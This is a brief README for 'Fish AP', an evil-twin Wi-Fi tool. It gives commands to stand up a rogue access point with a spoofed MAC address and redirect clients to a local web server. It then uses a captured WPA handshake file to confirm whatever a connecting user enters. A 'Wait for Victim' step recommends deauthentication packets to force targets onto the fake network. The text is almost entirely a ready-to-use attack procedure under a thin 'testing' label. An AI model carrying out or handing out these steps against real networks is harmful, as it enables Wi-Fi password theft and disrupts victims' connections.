# Fish AP

## Overview

Fish AP is a tool designed to create an Access Point (AP) and run a web server for targeted network testing. It provides functionality to redirect network traffic and capture authentication handshakes.

## Usage

### Step 1: Create Access Point

Use `berate_ap` to create an AP with the following command:

```bash
./berate_ap --no-virt -n wlan1 example --redirect-to-localhost --mac XX:XX:XX:XX:XX:XX
```

- Argument Details:
  - --no-virt: Disables the creation of a virtual interface.
  - -n wlan1: Specifies the network interface.
  - example: Name of the access point.
  - --redirect-to-localhost: Redirects the traffic to localhost.
  - --mac XX:XX:XX:XX:XX:XX: Sets a custom MAC address for the AP.

### Step 2: Setup Web Server

Copy the captured handshake file to the web server directory:

```bash
cp ./airodump-wifi.cap ./web/handshake.cap
```

Run the script to start the app and check for a successful connection:

```bash
./run_app_exit_if_success.sh MM:MM:MM:MM:MM:MM 192.168.12.1
```

- Argument Details:
  - MM:MM:MM:MM:MM:MM: MAC address to get message from .cap file
  - 192.168.12.1: IP address for the interface web server

### Step 3: Wait for Victim

- Enhance Effectiveness:
  - Send deauthentication packets to disconnect the target and make them reconnect through your AP.
  - Optionally, use a virtual interface for combining techniques to increase the effectiveness of the test.
